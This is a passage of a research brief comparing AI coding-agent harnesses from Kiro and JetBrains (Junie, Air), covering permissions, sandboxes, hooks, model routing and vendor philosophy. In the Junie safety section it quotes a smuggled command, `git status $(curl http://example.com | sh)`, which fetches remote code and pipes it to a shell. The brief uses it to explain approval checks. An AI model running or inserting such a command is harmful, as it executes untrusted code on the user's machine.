**Extensibility.** Hooks [P\*] kiro.dev/docs/hooks: JSON files in `.kiro/hooks/` or `~/.kiro/hooks/`; triggers include `PostFileSave`, `PreToolUse`, `PostToolUse`, `Stop`; actions `command` (shell, session JSON on stdin, 60 s default timeout) or `agent` (inject a prompt). Custom agents, skills, powers (support Agent Plugins since Aug 7, 2026), MCP, ACP server (`kiro-cli acp`), headless CLI for CI, automations on a schedule in cloud sandboxes, and Kiro Crew as an open-source orchestrator over ACP [P]/[P\*].

**Model coupling.** Model-agnostic with an Auto router. Providers on the models page: Anthropic, OpenAI, MiniMax, Zhipu (GLM), DeepSeek, Qwen, plus Kimi K3 [P\*]. Auto: "select Auto to let Kiro route each task to the optimal model automatically"; the page does not list what Auto routes between [P\*]. We found no primary source saying AWS trains a model for Kiro. [R] A third-party guide says Auto routes between Claude and Amazon Nova; no primary source supports it.

### 2.3 How Kiro tests its own harness

"How Kiro fixes itself, and how we keep the fixes honest", nine authors from Applied Science and Engineering, Oct 20, 2026, https://kiro.dev/blog/how-kiro-fixes-itself/ [P]: an internal tracer (kiro-trace) reads Kiro's runs, proposes one change at a time, and runs it through a three-stage gate against a control. First week: eight PRs, seven merged, one closed for unrelated reasons, none sent back in code review [P]; fixes targeted misleading tool descriptions, unnecessary re-reads and over-eager subagent delegation [P\*]. Quotes [P]:

> "Models can propose changes, but we use deterministic code to accept or reject them."

> "A loop that grades its own fixes would have shipped it." (about a gain that came from one lucky run)

> "Try removing before adding. The safest wins are often removals, especially as models get better."

> "We judge an agent experiment first by what it rejects."

"Kiro proves properties of its own harness in Lean", Kharkov, Erata, Omidvar-Tehrani, Mukherjee, Nov 2, 2026, https://kiro.dev/blog/harness-properties-in-lean/ [P]: "We analyzed 96 candidate properties and observations across models of 26 functions. Lean proved 70 of them, two received finite bounded checks, 18 were falsified in the model and reproduced against the analyzed code, and six produced partial results or observations". Scope note: the 26 functions span three codebases (the agent server, the Kiro CLI and Kiro Crew), not the harness alone, and the work was done by Kiro CLI running Claude Opus 5.5 on Amazon Bedrock [P]. Proven examples [P]: a subagent is never less restricted than its parent; tightening a policy never turns a refusal into an approval; truncated tool output stays within its cap; model fallback stops after three switches. Rationale [P]: "Ordinary non-exhaustive test suites sample behavior; a proof establishes a universal result for the formal model." "None of the bugs in any of the three codebases were security findings." [P]

### 2.4 Amazon philosophy (spec-driven development)

- **Problem statement.** "prompt, prompt, prompt, and you have a working application. It's fun and feels like magic." The post then says getting such a prototype to production is the hard part [P] Introducing Kiro, Nikhil Swaminathan and Deepak Singh, Jul 14, 2025 (possibly stale), https://kiro.dev/blog/introducing-kiro/. "Kiro is great at 'vibe coding' but goes way beyond that". EARS acceptance criteria make "your prompt assumptions explicit, so you know Kiro is building what you want." [P]
- **What a spec is for.** Marc Brooker, VP/Distinguished Engineer, Jul 15, 2025 (possibly stale), https://kiro.dev/blog/kiro-and-the-future-of-software-development/ [P]:
  > "A specification is a kind of (version controlled, human-readable) super prompt."
  > "A North Star to guide the work of the agent, allowing it to take on larger tasks without getting lost."
  > "the specification tames the chaos of prompt-driven vibe coding on large code bases, moving away from an ad-hoc exercise in prompt engineering"
  > "a future of programming where outcomes matter more than implementation details"
- **Restated one year on.** "developers deserve better than vibe coding. They deserve tools that help them think clearly, build confidently, and ship production-ready software without trading speed for quality." [P] Deepak Singh, Jul 14, 2026, https://kiro.dev/blog/one-year/
- **Harness design.** "The client owns how the user interacts with the agent and how it presents the agent's work." [P] one-agent. Kiro Crew: "A workspace acting on your code should also never be a black box." [P]
- **Explicitly rejected:** ad-hoc prompting on large codebases (Brooker); library-shaped harnesses that let client code reach into agent internals ("Then you're back to diverging implementations") [P]; self-graded improvement loops (kiro-trace post) [P].

Spec workflow details [P\*] kiro.dev/docs/specs: Feature specs (Requirements-First or Design-First), Bugfix specs (`bugfix.md`: current, expected, unchanged behaviour), Quick Spec (all three files in one pass, no approval gates); files `requirements.md`/`bugfix.md`, `design.md`, `tasks.md`; Analyze Requirements flags gaps before design; Correctness (IDE only) adds property-based testing. "Specs just got faster (and smarter)" May 12, 2026; "Spec it safe" security requirements in specs Oct 30, 2026 [E] titles.

### 2.5 Amazon direction (last 6 months)

Shipped [P]/[P\*]: Q Developer end-of-support plan (Apr 30); Opus 4.8, Sonnet 5, Opus 5, GPT-5.6, Fable 5.1, Opus 5.5, Sonnet 5.5, Kimi K3, Haiku 5.5 (May to Oct); Kiro Web with Specs and GitLab (Jun 11); iOS (Jun 17); automations (Jun 18); Agent Focus (Jun 25); shared harness (Aug 3); Kiro Crew (Aug 4); cloud sessions GA (Sep 3); workflows (Sep 30); CLI V3 (Oct 9); local sandbox (Oct 14); memory (Oct 20); Lean proofs (Nov 2); Kiro CLI 3.0 (Nov 3); team credit pooling (Nov 4).

Stated next [P\*] one-year: expansion across IDE, CLI, Web and Mobile; more models from more providers; more partner integrations. Retiring with CLI 3.0: inline shell autocomplete, the CLI desktop app, and Classic [P\*] cli-3.

---

## 3. JetBrains

### 3.1 What exists on 2026-11-04

| Product | Status | Source |
|---|---|---|
| **Junie** (IDE plugin + CLI) | JetBrains' coding agent. Junie CLI beta March 2026; Junie GA Jun 17, 2026. Same engine behind AI chat, the Junie tool window and Junie CLI. | [P] blog.jetbrains.com/junie/2026/06 and /2026/03 |
| **Junie Lite** | Free model tier, Qwen 3.6 27B on JetBrains infrastructure, Oct 2, 2026; "Offer is valid until 31 Dec 2026" [P]. | [P\*] junie.jetbrains.com/blog/junie-lite (date and offer line [P]) |
| **Junie Local** | Runs Qwen3.6-27B (4-bit) on an M5 Mac with 64 GB (Aug 24, 2026), then NVIDIA RTX Spark and stable Windows (Oct 16). JetBrains "chose and tuned" the model against its agent loop. | [P\*] junie.jetbrains.com/blog/junie-local-launch; blog index |
| **JetBrains Air** (umbrella, Sep 22, 2026) | Air in JetBrains IDEs (EAP, early Oct 2026), Air Teams, Air Governance (formerly JetBrains Central). | [P] blog.jetbrains.com/blog/2026/09/22/introducing-jetbrains-air |
| **Air (March 2026 standalone ADE)** | Public preview Mar 2026, macOS first, built on the shelved Fleet IDE; ran Codex, Claude Agent, Gemini CLI, Junie. | [S] DevClass, Mar 11, 2026 |
| **JetBrains Central** | Announced Mar 24, 2026 as a control and execution layer; now Air Governance. | [S] InfoWorld, The Register; [P] Air post names the rename |
| **AI Assistant** | Remains "available and supported as a separate plugin"; installing Air from its notification disables AI Assistant. | [P] Air in IDEs EAP post |
| **Mellum2 / Mellum2.1** | JetBrains-trained open models, 12B MoE with 2.5B active, Apache 2.0 on Hugging Face (Mellum2.1 Thinking Sep 20, 2026). | [P] huggingface.co/JetBrains API; [S] release date Jun 1, 2026 |
| **Kineto** | No-code app builder, EAP Aug 2025. No 2026 product news found, only job postings. | [S] (possibly stale) |

[R] The Junie GA post calls ACP "the Agent Communication Protocol". The protocol JetBrains co-develops with Zed is the Agent Client Protocol (agentclientprotocol.com). Do not copy the GA post's expansion onto a slide.

**Pricing.** [S] DevClass (Mar 2026): Junie from $10/month individual to $60/month enterprise; BYOK at no platform charge [P] Junie CLI post. JetBrains' pricing page did not render for our fetcher. A JetBrains AI subscription "is currently required for cloud runs" in Air [P].

**Benchmark claim** [P] Junie GA post quoting Alexander Golubev (Nebius): "Junie came out as the top model-harness, with 61.6% resolved and a 72.7% pass@5" on SWE-Rebench. One cycle, vendor-chosen.

### 3.2 Junie internals

**Agent loop.** Plan mode makes "the plan a first-class artifact": a structured document with tabs for product requirements, technical design, delivery stages and optional testing strategy, stored in `.junie/plans`, edited by the user, then confirmed [P] GA post. The post pairs this with a cost tactic [P]: "Plan on a strong model; implement on a cheap one." Subagents [P\*] docs/junie-cli-subagents: Markdown with frontmatter in `.junie/agents/`, `.agents/`, `~/.junie/agents/`; fields include `tools`, `disallowedTools`, `mcpServers`, `model`, `permissionMode`, `reasoningLevel`, `maxTurns`, `skills`; the main agent picks one by name and description; you cannot invoke them by slash command; a subagent model policy `Auto` may use cheaper tiers. Junie imports agent files from `.cursor/agents/`, `.claude/agents/`, `.codex/agents/`. Also Debug mode, Remote mode, parallel sessions and worktrees, a code review agent, a `/demo` agent that records video and screenshots of a feature (Sep 17, 2026) [P] docs TOC.

**Tools.** Tool groups `Read`, `Bash`, `Glob`, `Grep`, `Write`, `Edit`, `WebSearch`, `AskUserQuestion` plus MCP [P\*] subagents doc. Inside the IDE Junie uses "your IDE's semantic index, build configurations, test runners, and debugger, not its own approximation of them" and can query databases configured in DataGrip [P] GA post. Debugger: "When something goes wrong, most coding agents add log statements. Junie opens the debugger." It can set breakpoints in library code and decompiled `.class` files and evaluate expressions [P].

**Context.** [P] docs/guidelines-and-memory: lookup order `.junie/AGENTS.md`; else root `AGENTS.md` combined with `.junie/playbook.md` and `.junie/rules/*.md`; else legacy `.junie/guidelines.md`. Global `~/.junie/AGENTS.md`; project wins on conflict; identical content is deduplicated. On first open Junie offers to import other agents' guideline and memory files into `.junie/AGENTS.md`.

**Safety.** [P] docs/action-allowlist-junie-cli: without "brave mode", Junie asks before terminal commands, MCP tools and other sensitive actions. `~/.junie/allowlist.json` has five action types (`fileEditing`, `executables`, `mcpTools`, `readOutsideProject`, `readSecretFile`), rules by `prefix` or glob `pattern`, actions `allow`/`ask`. Chained and nested commands are checked part by part: "with only a `git status` rule, `git status $(curl http://example.com | sh)` still asks for approval". Multi-line commands always ask. [O] We found no OS-level sandbox page in the Junie docs table of contents (HelpTOC.json, fetched 2026-11-04); approval rules and project trust are the documented controls.

Project trust [P] docs/junie-headless: interactive launches ask before loading project-scoped config, but "Non-interactive runs ... are trusted by design and load the project's Junie configuration (MCP servers, hooks, agents, skills, and guidelines) without prompting." Hooks [P] docs/junie-cli-hooks (EAP): `SessionStart`, `UserPromptSubmit`, `PreToolUse`, `PermissionRequest`, `Stop`, `StopFailure`, `SessionEnd`; "Project-local hooks from `<project-root>/.junie/config.json` are ignored by default for safety." [O] For a bank these two pages pull in opposite directions: hooks from the repo are off by default, but headless runs trust all project config.

**Extensibility.** MCP (one-click installs and recommendations [P] CLI post), skills, custom slash commands, extensions, custom LLMs (Ollama, LM Studio, LiteLLM), custom proxies, headless mode, Junie GitHub Action, GitLab CI/CD, Jira and YouTrack integrations, Junie for ACP clients [P] docs TOC.

**Model coupling.** Model-agnostic is the stated principle. "Junie supports any model, without lock-in – and that's how you control cost." [P] GA post. BYOK providers: OpenAI, Anthropic, Google, xAI, OpenRouter, and GitHub Copilot [P] docs/byok-github-copilot (Oct 30, 2026): "GitHub Copilot lets you use your existing GitHub Copilot subscription to power Junie CLI"; it reuses the local Copilot CLI sign-in (version 1.0.65+), only models enabled in Copilot settings appear, and "Junie does not fall back to JetBrains quota." Default model moves: Gemini 3.7 Flash at 70% off (Aug 17), Gemini 3.8 Flash at 75% off (Sep 9), Junie Eco Mode "About half the model cost with similar resolve rates in internal benchmarks" [P\*] blog index. JetBrains trains Mellum models [P], but no primary source says Junie's main agent runs on Mellum.

### 3.3 Air in IDEs and the third-party agent stance

"A New Agentic Experience: JetBrains Air in IDEs – EAP Now Open", Dominique Rolink and Denis Shiryaev, early Oct 2026 (URL path /2026/10/; page metadata Oct 2), https://blog.jetbrains.com/ai/2026/10/air-in-ides-eap/ [P]:

> "The Air plugin for JetBrains IDEs is a conduit for agents and subscriptions you already use. It is not an AI provider, and it ships with no agents installed."

> "We tried to integrate that function into our existing AI Assistant solution by adding more agents to the AI chat. But as these workflows evolved, one thing became clear: Orchestrating several tasks concurrently is fundamentally different from having a conversation with AI."

> "Agentic development is becoming the norm, and an IDE that keeps agents at arm's length will struggle to stay relevant."

> "Air supports Codex, Gemini, GitHub Copilot, Claude Agent, and Junie out of the box, and many others can be connected via ACP."

> "With a third-party subscription, data goes directly to that provider under the agreement you already have with them. It doesn't pass through JetBrains."

Features [P]: sessions across projects with per-session cost; double-tap Ctrl to delegate with current context; sessions as editor tabs, terminal UI or graphical chat; local or cloud runs (cloud needs JetBrains AI); temporary worktrees; mobile "coming soon"; built-in IDE skills and tools for debugging, profiling, database exploration and semantic code search for supported agents. Claude subscriptions work in "Air's terminal surface which opens as a full-screen IDE tab" [P].

ACP Registry [S] gihyo.jp, Zed blog: launched in beta Jan 28, 2026 by JetBrains and Zed; agents list once and appear in every ACP client; install via "Install From ACP Registry..." in JetBrains IDEs from 2025.3.2. Launch rosters differ by source. [S] The New Stack (Aug 2026): Junie came to ReSharper 2026.2 through ACP.

### 3.4 JetBrains philosophy

From "JetBrains Air: Building a System of Products for Agentic Software Development", Kirill Skrygan (CEO), Sep 22, 2026 (date from the URL path; the page byline shows no date in raw HTML), all nine quotes below checked verbatim against raw page text 2026-11-04, https://blog.jetbrains.com/blog/2026/09/22/introducing-jetbrains-air/ [P]:

> "AI can produce code. Organizations still have to produce software."

> "That system is based on a core belief that the future of agentic development will be multi-vendor. No single model, agent, or service will be right for every developer, team, or task."

> "As agents take on more of the execution, the bottleneck shifts from producing change to understanding, verifying, and owning it. Code becomes cheaper to generate but more expensive to verify."

> "An agent will not get the call at 3:00 am when something breaks."

> "Standardizing on one AI vendor today means making a multi-year commitment in a market that won't look the same next quarter."

> "We build our own agent, and we intend to make it excellent. But JetBrains Air does not require customers to use ours"

> "Agents spend time and money rediscovering information the codebase already contains. An agent that can retrieve that knowledge is cheaper and more accurate than one that has to reconstruct it."

> "The era in which the whole software development system can be contained in one window is ending."

> "We will not name future products before their scope and availability are ready to be confirmed."

From Junie [P]: "What if an AI coding agent didn't just guess at the details of your project, but actually used the same tools you do?" (GA post, Dmitry Savelev, Jun 17, 2026). Junie Lite [P]: "It won't out-argue a frontier model on a gnarly multi-file refactor, and it isn't trying to."

Explicitly rejected [P]: single-vendor lock-in; agents bolted into chat ("fundamentally different from having a conversation with AI"); println debugging by agents; "better prompting" as a substitute for a reviewed plan document ("This approach is superior to 'better prompting'").

### 3.5 JetBrains direction (last 6 months)

Shipped [P]/[P\*]/[S]: Mellum2 (Jun 2026, [S] date); Junie GA with ACP-based IDE integration (Jun 17); new Gemini Flash defaults (Aug 17, Sep 9); Junie Local (Aug 24); `/demo` agent (Sep 17); Junie Local update (Sep 18); JetBrains Air umbrella and Central renamed Air Governance (Sep 22); Air in IDEs EAP and free Junie Lite (early Oct); Junie Local on RTX Spark (Oct 16); GitHub Copilot as a Junie model provider (Oct 30); Mellum2.1 Thinking MTP (Oct 30, Hugging Face).

Stated next [P] Air post: Air will "extend further into mobile and remote experiences"; "More work will be triggered by repository events, schedules, and delivery processes rather than by a developer opening an editor and issuing a prompt"; richer context from "code, architecture, repositories, runtime behavior, and organizational knowledge". Air in IDEs post: "Over time, we expect Air to become the primary experience for agentic workflows in JetBrains IDEs."

---

## 4. Cross-vendor comparison

| | Gemini CLI | Antigravity (App/CLI) | Kiro (IDE/CLI/Web) | Junie (+ Air) |
|---|---|---|---|---|
| Source | Open, Apache 2.0 [P] | Closed [O]/[S] | Closed; Kiro Crew open (Apache 2.0) [P] | Closed; Mellum open weights [P] |
| Instruction files | GEMINI.md (+ JIT subdir files, configurable to AGENTS.md) [P] | AGENTS.md, GEMINI.md, `.agents/rules/*.md` with 4 activation modes [P\*] | `.kiro/steering/*.md` (4 inclusion modes) + AGENTS.md [P\*] | `.junie/AGENTS.md` or AGENTS.md + rules [P] |
| Edit tool | `replace` (old_string/new_string + `instruction`) [P] | `replace_file_content` (params not documented) [P\*] | `write` (ops not documented on page) [P\*] | `Edit`, `Write` groups [P\*] |
| Code search | grep (ripgrep), glob [P] | `grep_search`, research subagent [P\*] | grep, glob, `code` tool with LSP [P\*] | IDE semantic index when in IDE [P] |
| Plan mode | Default on, read-only tool subset [P] | `/plan`, `/grill-me` [P] | Specs (requirements/design/tasks) [P\*] | Plan doc in `.junie/plans` [P] |
| Permissions | Policy engine, approval modes [P\*] | `action(target)` Deny>Ask>Allow, presets [P\*] | Cedar capabilities, deny wins [P] | allowlist.json allow/ask, brave mode [P] |
| OS sandbox | Optional: Seatbelt, Docker/Podman, gVisor, LXC, bubblewrap [P] | Namespaces / Seatbelt / AppContainer; on in App Default, off in CLI [P\*] | Seatbelt / bubblewrap / AppContainer; off by default [P\*] | None documented [O] |
| Classifier auto-approve | No | Auto mode (not for business or enterprise accounts) [P] | No | No |
| Async / cloud | No | Remote agents rolling out Nov 3, 2026 [P\*] | Cloud sessions GA (us-east-1) [P\*] | Cloud runs via Air (JetBrains AI needed) [P] |
| ACP | Agent (`--acp`) [P] | Not in changelog | Harness protocol is ACP [P] | Agent and IDE client [P] |
| Models | Gemini only | Gemini + Claude 5.5 via Vertex ADC [P] | Multi-vendor + Auto router [P\*] | Any; BYOK incl. Copilot; local [P] |
| Trains own model for harness | Gemma/Gemini, harness tied to training stack (stated for Antigravity) [P] | Yes, stated goal [P] | None found | Mellum (not stated as Junie's engine) [P] |

## 5. [O] Notes for the presentation

- Three different bets, each stated in the vendor's own words: Google ties harness to model training and moves the IDE out of the centre; AWS puts a written spec and formal checks around the agent; JetBrains sells the neutral layer above many agents plus IDE intelligence.
- The "same harness on every surface" pattern now shows up at Google (Antigravity CLI and App), AWS (Kiro harness process over ACP) and JetBrains (one Junie engine over ACP). The track1 Copilot files describe the same move at GitHub.
- Sandboxes are converging on Seatbelt plus bubblewrap or namespaces plus Windows AppContainer, but two of the three ship them off by default in the CLI.
- For the bank: Kiro's capability permissions with deny-wins and MDM-pushed steering, and Junie's chained-command checking, are concrete patterns to compare against Copilot's settings (round2-agent-permission-models.md). Junie's headless trust rule is a counter-example to flag.
- Product churn is the headline risk: in six months Google retired or restricted three coding products (Gemini CLI consumer tier, Jules, Code Assist sales). Any slide naming Google tools needs a date on it.

## 6. Open questions

- Antigravity CLI licence: no official statement found; "closed source" comes from secondary sources and our repo search.
- Whether Gemini 4 Argon was trained in the Antigravity harness: Google states the goal, not the result.
- Antigravity's knowledge base in 2026: described in the 2025 launch post, absent from the 2026 docs we read.
- Kiro's edit tool operations and the V3 tool catalog (separate docs page not fetched).
- Whether Kiro Auto routes to any Amazon model.
- JetBrains pricing for 2026 (page did not render); fate of the March 2026 standalone Air app after the September umbrella rebrand.
- JetBrains Central launch post and ACP Registry post returned bot challenges; those facts rest on secondary sources.
- Junie: no documented OS-level sandbox; confirm with JetBrains before telling an audience it has none.

## Verification pass (2026-11-04)

Method: each page downloaded with curl and stripped to plain text, then every quote string-matched against the raw text (not a summariser). Repo facts came from the GitHub API. Where this pass checked a quote verbatim it is now [P].

**Headline claims checked (13 of 13 hold, two with nuance):**
1. Gemini CLI consumer cutoff June 18, 2026; Code Assist Standard/Enterprise, Code Assist for GitHub via Google Cloud and paid Gemini / Agent Platform API keys keep it. Confirmed on the transition post. All four 1.2 quotes verbatim.
2. Antigravity 2.0 "Integrate the Antigravity product agent harness with the Gemini training and evaluation stacks" and "there is no IDE". Confirmed; "there is no IDE" describes the 2.0 desktop App, not the separate Antigravity IDE, which still exists.
3. Jules turndown Oct 29, 2026; read-only after Nov 11; wind-down Dec 31, 2026. Confirmed on the changelog; upgraded to [P].
4. Code Assist Standard/Enterprise sales end Oct 9, 2026, Antigravity named as alternative. Confirmed on the release notes; upgraded to [P].
5. Claude Opus 5.5 / Sonnet 5.5 via ADC in App v2.24.0 (Oct 15) and CLI v1.3.6 (Oct 15). Confirmed; the earlier quoted wording was slightly off and is corrected in 1.4. Auto unavailable to business and enterprise accounts: confirmed on docs/permissions, not the changelog.
6. Q Developer CLI repo README: "a closed-source product", "will only receive critical security fixes". Confirmed verbatim; last push Aug 24, 2026, Apache-2.0, not archived.
7. Q Developer IDE plugins and paid subscriptions end of support April 30, 2027; Console unaffected. Confirmed (Ankit Sharma, 30 Apr 2026).
8. Kiro harness over ACP, Cedar-backed capabilities. Confirmed. Nuance added: it is one harness binary, run per client (child process over stdio locally, cloud sandbox over WebSocket for Web and iOS), not a single shared process.
9. Lean 70 of 96, 26 functions, 18 falsified and reproduced. Confirmed. Nuance added: the functions span the agent server, Kiro CLI and Kiro Crew; six more were partial; two got bounded checks.
10. Brooker "super prompt" quote, Jul 15, 2025, VP/Distinguished Engineer. Confirmed verbatim, as are the other three Brooker quotes.
11. Skrygan Air quotes. Confirmed verbatim, all nine quotes in 3.4 plus the three "stated next" fragments. Date rests on the URL path.
12. Air in IDEs "ships with no agents installed"; "Codex, Gemini, GitHub Copilot, Claude Agent, and Junie out of the box". Confirmed verbatim, as are all five 3.3 quotes and the authors.
13. Junie CLI with GitHub Copilot subscription, page dated 30 October 2026, Copilot CLI 1.0.65+, "Junie does not fall back to JetBrains quota". Confirmed.

**Corrected:**
- Gemini CLI "v0.69 nightly on Nov 4": no such release. Nov 4 releases are v0.67.0, v0.67.0-nightly.20261104 and v0.68.0-preview.0; `0.69.0-nightly.20261104` is only the version string in `main`'s package.json.
- Kiro one-year post: "roughly doubled every quarter" was a paraphrase in quote marks; the post says "Kiro developers have been doubling over quarters".
- Kiro Crew: "over 39,000 internal builders" was reworded; the post says "adopted internally by over 39,000 Amazon builders".
- "bring learnings from Jules into Antigravity" was not verbatim; replaced with the Jules changelog wording.
- Antigravity Claude 5.5 changelog wording corrected ("also offers ... when your project has access to them").

**Also spot-checked and confirmed [P]:** Gemini CLI 108.7k stars and "Not tuned for the Gemini 4 series" / "Don't use Gemini CLI to benchmark Gemini models" README lines; 100,000 stars / 6,000 merged PRs on the transition post; Antigravity launch quotes (Nov 18, 2025) incl. the 20% remote-only quote and the knowledge-base line; Antigravity App v2.29.0 Nov 3, CLI v1.4.12 Oct 30, IDE v2.6.0 Oct 26; Argon 35% / 30% figures; I/O $100 Ultra plan and Gemini API line; all four kiro-trace quotes and the eight/seven PR count; Deepak Singh 100,000 developers in 5 days; Introducing Kiro quotes (Jul 14, 2025); Kiro pricing tiers and model multipliers; Kiro Crew 4,791 stars and "black box" quote; Kiro memory and sandbox "off by default" lines; Junie GA quotes incl. 61.6% / 72.7% SWE-Rebench and "Agent Communication Protocol" (so the [R] note on that post stands); Junie Lite quote and 31 Dec 2026 offer end; Junie allowlist `git status $(curl ...)` example and headless trust sentence; Antigravity docs/rules, docs/subagents and Auto preset quotes.

**Not verified in this pass (tags left as they were):** Gemini CLI internals by version number (changelog entries tagged [P\*]); Antigravity CLI licence; Kiro hooks, steering and built-in tools pages; Kiro "15,000+ community powers"; Junie Local, Mellum2 dates, DevClass pricing, ACP Registry launch details, JetBrains Central launch date; Antigravity pricing page figures ($30 per seat).
